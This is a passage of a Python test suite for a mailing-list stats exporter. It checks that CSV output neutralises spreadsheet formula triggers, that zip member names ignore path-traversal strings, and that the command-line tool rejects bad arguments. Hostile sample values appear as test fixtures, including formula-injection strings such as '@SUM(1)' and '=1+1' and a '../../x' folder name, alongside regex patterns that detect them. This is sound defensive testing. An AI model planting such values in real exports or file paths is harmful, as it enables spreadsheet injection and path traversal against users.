    conn.execute("UPDATE messages SET from_name = ? WHERE message_id = ?", ("'=quoted", M4))
    conn.execute("UPDATE messages SET in_reply_to = ? WHERE message_id = ?", ("@SUM(1)", M6))
    conn.execute("UPDATE messages SET timing_cpm = ? WHERE message_id = ?", (-5.5, M1))
    conn.execute(
        "UPDATE addresses SET email = ? WHERE email = ?", ("-bob@example.org", "bob@example.org")
    )
    conn.execute(
        "UPDATE addresses SET email = ? WHERE email = ?",
        ("+carol@example.org", "carol@example.org"),
    )
    conn.execute(
        "UPDATE lists SET name = ?, folder = ? WHERE folder = ?", ("\tann", "+ann", ANNOUNCE)
    )
    conn.commit()


def test_cell_escapes_formula_triggers_and_leaves_other_values_alone():
    cell = stats_export._cell
    for value in ("=1+1", "+1", "-1", "@A1", "\tx", "\rx", "'=x", "''-x"):
        assert cell(value) == "'" + value
    for value in ("Alice", "'Quoted Name'", "'", "", "a=b", "x-y", "<m1@example.org>"):
        assert cell(value) == value
    # Numbers, negatives included, and booleans are not text and are not escaped.
    assert cell(-1) == -1
    assert cell(-0.5) == -0.5
    assert cell(True) == "true"
    assert cell(None) == ""


def test_hostile_text_is_escaped_in_every_member(source, tmp_path):
    _make_hostile(source)
    path = _export(source, tmp_path)
    rows = _by_message_id(_rows(path, MESSAGES_MEMBER))
    assert rows[M1]["sender_name"] == "'" + HOSTILE_NAME
    assert rows[M2]["sender_name"] == "'" + HOSTILE_CMD
    assert rows[M4]["sender_name"] == "''=quoted"
    assert rows[M6]["in_reply_to"] == "'@SUM(1)"
    assert rows[M2]["email"] == "'-bob@example.org"
    assert rows[M4]["email"] == "'+carol@example.org"
    assert (rows[M1]["list"], rows[M1]["folder"]) == ("'\tann", "'+ann")
    # A negative number is written as a number.
    assert rows[M1]["timing_cpm"] == "-5.5"
    lists = {row["folder"]: row for row in _rows(path, LISTS_MEMBER)}
    assert lists["'+ann"]["list"] == "'\tann"
    senders = {row["email"] for row in _rows(path, SENDERS_MEMBER)}
    assert {"'-bob@example.org", "'+carol@example.org"} <= senders
    # No field of any member begins with an unescaped trigger character.
    for member in (MESSAGES_MEMBER, LISTS_MEMBER, SENDERS_MEMBER):
        text = io.StringIO(_member_bytes(path, member).decode("utf-8"), newline="")
        for record in csv.reader(text):
            for field in record:
                assert not re.match(r"[=+@\t\r]", field)
                assert not re.match(r"-[^0-9]", field)


def test_escaping_keeps_the_joins_and_keys_intact(source, tmp_path):
    _make_hostile(source)
    path = _export(source, tmp_path)
    messages = _rows(path, MESSAGES_MEMBER)
    folders = {row["folder"] for row in _rows(path, LISTS_MEMBER)}
    emails = {row["email"] for row in _rows(path, SENDERS_MEMBER)}
    assert {row["folder"] for row in messages} <= folders
    assert {row["email"] for row in messages if row["email"]} <= emails


def test_readme_rule_recovers_the_stored_values(source, tmp_path):
    _make_hostile(source)
    path = _export(source, tmp_path)
    readme = _member_bytes(path, README_MEMBER).decode("utf-8")
    assert "`^'+[=+\\-@\\t\\r]`" in readme
    rows = _by_message_id(_rows(path, MESSAGES_MEMBER))
    stored = {
        row["message_id"]: row
        for row in source.conn.execute(
            "SELECT m.message_id, m.from_name, m.in_reply_to, a.email FROM messages m "
            "LEFT JOIN addresses a ON a.id = m.address_id"
        )
    }
    for message_id, row in rows.items():
        want = stored[message_id]
        if want["from_name"]:
            assert _unescape(row["sender_name"]) == want["from_name"]
        assert _unescape(row["in_reply_to"]) == (want["in_reply_to"] or "")
        assert _unescape(row["email"]) == (want["email"] or "")
        assert _unescape(row["folder"]) in {"+ann", LAST_CALL}
    # The descriptor carries the stored folder values unaltered.
    assert "+ann" in _mlac(path)["folders"]


def test_ordinary_values_are_byte_identical_to_an_unescaped_export(source, tmp_path, monkeypatch):
    """The fixture holds no trigger values, so escaping changes no byte of any CSV."""
    escaped = _export(source, tmp_path, name="escaped")
    monkeypatch.setattr(stats_export, "_neutralise_formula", lambda value: value)
    plain = _export(source, tmp_path, name="plain")
    for member in (MESSAGES_MEMBER, LISTS_MEMBER, SENDERS_MEMBER):
        assert _member_bytes(escaped, member) == _member_bytes(plain, member)


def test_member_names_are_fixed_whatever_the_stored_strings(source, tmp_path):
    """No member name is derived from a list name or other stored value."""
    source.conn.execute(
        "UPDATE lists SET name = ?, folder = ? WHERE folder = ?", ("../../x", "../../x", ANNOUNCE)
    )
    source.conn.commit()
    path = _export(source, tmp_path)
    with zipfile.ZipFile(path) as archive:
        assert sorted(archive.namelist()) == sorted(
            [MESSAGES_MEMBER, LISTS_MEMBER, SENDERS_MEMBER, DATAPACKAGE_MEMBER, README_MEMBER]
        )


# ==============================================================================
# CLI
# ==============================================================================


def _build_source_db(path: Path) -> None:
    with Store(path) as store:
        _build_source(store)


def test_stats_export_main_writes_the_archive(tmp_path, caplog):
    import logging

    src = tmp_path / "src.db"
    _build_source_db(src)
    out = tmp_path / "cli-stats"

    with caplog.at_level(logging.INFO, logger="mailing_list_ai_check.export-stats"):
        rc = stats_export_main(["--all-lists", "-o", str(out), "--db", str(src)])
    assert rc == 0
    written = tmp_path / "cli-stats.zip"
    assert f"path={written}" in caplog.text
    assert len(_rows(written, MESSAGES_MEMBER)) == 6
    assert _mlac(written)["stats_format_version"] == 2


def test_stats_export_main_named_and_ranged(tmp_path):
    src = tmp_path / "src.db"
    _build_source_db(src)
    out = tmp_path / "cli-range.zip"
    rc = stats_export_main(
        ["announce", "-o", str(out), "--db", str(src), "--date-from", "2026-01-15"]
    )
    assert rc == 0
    assert _mlac(out)["date_from"] == "2026-01-15"
    assert _mlac(out)["folders"] == [ANNOUNCE]
    assert "email" in _columns(out, MESSAGES_MEMBER)


def test_stats_export_main_rejects_the_removed_pseudonymous_flag(tmp_path):
    """Version 2 has one variant; the flag is gone rather than ignored."""
    src = tmp_path / "src.db"
    _build_source_db(src)
    with pytest.raises(SystemExit) as exc:
        stats_export_main(
            ["--all-lists", "-o", str(tmp_path / "x.zip"), "--db", str(src), "--pseudonymous"]
        )
    assert exc.value.code == 2


@pytest.mark.parametrize("flag", ["--date-from", "--date-to"], ids=["from", "to"])
def test_stats_export_main_rejects_an_unparseable_date(tmp_path, flag):
    src = tmp_path / "src.db"
    _build_source_db(src)
    with pytest.raises(SystemExit) as exc:
        stats_export_main(
            ["--all-lists", "-o", str(tmp_path / "x.zip"), "--db", str(src), flag, "last week"]
        )
    assert exc.value.code == 2


@pytest.mark.parametrize(
    "argv",
    [
        ["announce", "--all-lists"],
        [],
    ],
    ids=["both", "neither"],
)
def test_stats_export_main_rejects_a_bad_selection(tmp_path, argv):
    src = tmp_path / "src.db"
    _build_source_db(src)
    with pytest.raises(SystemExit) as exc:
        stats_export_main([*argv, "-o", str(tmp_path / "x.zip"), "--db", str(src)])
    assert exc.value.code == 2


def test_stats_export_main_requires_an_output_path(tmp_path):
    src = tmp_path / "src.db"
    _build_source_db(src)
    with pytest.raises(SystemExit) as exc:
        stats_export_main(["--all-lists", "--db", str(src)])
    assert exc.value.code == 2
